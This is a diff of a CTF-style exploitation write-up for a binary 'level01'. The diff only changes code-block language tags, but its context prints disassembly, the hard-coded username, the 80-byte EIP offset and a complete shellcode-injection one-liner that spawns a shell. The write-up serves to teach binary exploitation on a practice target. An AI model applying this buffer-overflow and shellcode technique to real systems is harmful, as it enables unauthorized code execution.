@@ -18,7 +18,7 @@ You have to pass the function `verify_user_name`,
 </br>
 and then trigger a buffer overflow and inject shellcode.
 
-```x86asm
+```nasm
 $ objdump -d ./level01 -M intel | sed -n '/<main>:/,/^$/p'
 080484d0 <main>:
  80484d0:       55                      push   ebp
@@ -97,7 +97,7 @@ In the function `verify_user_name` we can see that he's comparing,
 </br>
 the first 7 characters of our entry match what is found at `0x80486a8`
 
-```x86asm
+```nasm
 $ objdump -d ./level01 -M intel | sed -n '/<verify_user_name>:/,/^$/p'
 08048464 <verify_user_name>:
  8048464:       55                      push   ebp
@@ -128,7 +128,7 @@ $ objdump -d ./level01 -M intel | sed -n '/<verify_user_name>:/,/^$/p'
 
 you can find the value of `0x80486a8` in the .rodata files, and that is `dat_wil`
 
-```x86asm
+```nasm
 $ objdump -s -j .rodata ./level01
 
 ./level01:     file format elf32-i386
@@ -164,7 +164,7 @@ and after applying little-endian byte order, we get `6Ac7`.
 </br>
 Searching for this sequence in our cyclic pattern, we find it starts at `offset 80`. This means we need `80 bytes of padding` before we reach the saved `return address (EIP)`.
 
-```
+```bash
 $ gdb ./level01
 (gdb) run
 Starting program: /home/users/level01/level01
@@ -197,7 +197,7 @@ Overwrite the buffer to change the address of EIP and set it to the address of o
 </br>
 Since the `username buffer` is stored in `.bss` at a fixed address `(0x804a040)`, and the binary has no PIE, this address is reliable both inside and outside gdb, unlike stack addresses.
 
-```
+```bash
 $ (python -c 'print("dat_wil" + "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80")'; python -c 'print("A" * 80  + "\x47\xa0\x04\x08")'; cat -) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
